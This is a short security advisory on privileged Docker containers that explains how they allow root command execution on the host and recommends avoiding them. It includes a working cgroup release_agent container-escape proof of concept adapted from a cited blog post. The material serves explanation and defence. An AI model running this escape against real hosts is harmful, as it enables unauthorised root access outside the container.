# Privileged Docker Container

## Issue
Any docker container running as privileged has sufficient privledges to execute commands as root on the host operating system via:

1. Mounting the host root partition
2. Directly executing processes outside of the container namespace

## Example

The following POC is modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
```bash
  d="$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))"
  mkdir -p $d/w
  echo 1 >$d/w/notify_on_release
  t="$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)"
  touch /o
  echo $t/c >$d/release_agent
  printf "#!/bin/sh\n%s > %s/o" "$cmd" "$t">/c
  chmod +x /c
  sh -c "echo 0 >$d/w/cgroup.procs"
  sleep 1
  cat /o

  # Tidy up
  rm /c /o
```

## Fix
The solution is to avoid using privileged containers when possible.

## Resources
- [understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [exploit-db](https://www.exploit-db.com/exploits/47147)


